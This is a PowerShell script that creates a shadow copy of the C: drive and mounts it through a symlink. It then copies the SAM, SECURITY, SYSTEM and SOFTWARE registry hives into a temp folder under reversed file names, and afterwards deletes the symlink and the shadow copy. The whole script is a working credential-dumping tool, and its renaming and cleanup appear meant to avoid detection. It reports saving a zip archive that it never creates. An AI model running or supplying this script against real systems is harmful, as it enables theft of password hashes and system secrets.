# zagnox
$store = "C:\Windows\Temp"

Write-Output "[+] Creating shadow copy"
# Create C: shadow copy
wmic shadowcopy call create Volume='C:\' > $null 2>&1

# Get shadow copy ID and Path
$ghostID = (vssadmin list shadows | Select-String -Pattern "Shadow Copy ID:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()
$ghostPath = (vssadmin list shadows | Select-String -Pattern "Shadow Copy Volume:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()

Write-Output "[*] ShadowCopy UUID: $ghostID"
Write-Output "[*] ShadowCopy Path: $ghostPath"

# Mount shadow copy
$mali = "$store\backup"
Write-Output "[+] Mounting shadow copy in $mali"
cmd /c "mklink /d $mali $ghostPath"

# Get stampas
$stampa = Get-Date -Format "yyyyMMdd_HHmmss"
$zinxho = "$store\backup_$stampa.zip"

# Copy LSA files
Write-Output "[+] Copying SAM..."
copy "$mali\windows\system32\config\sam" "$store\${stampa}_mas"
Write-Output "[+] Copying SECURITY..."
copy "$mali\windows\system32\config\security" "$store\${stampa}_ytiruces"
Write-Output "[+] Copying SYSTEM..."
copy "$mali\windows\system32\config\system" "$store\${stampa}_metsys"
Write-Output "[+] Copying SOFTWARE..."
copy "$mali\windows\system32\config\software" "$store\${stampa}_erawtfos"

# Deletes mounted folder
Write-Output "[-] Deleting symlink"
rm $mali

# Delete shadow copy
Write-Output "[-] Deleting shadow copy"
vssadmin delete shadows /Shadow="$ghostID" /Quiet > $null 2>&1

Write-Output "[+] Operation completed. Archive saved at $zinxho"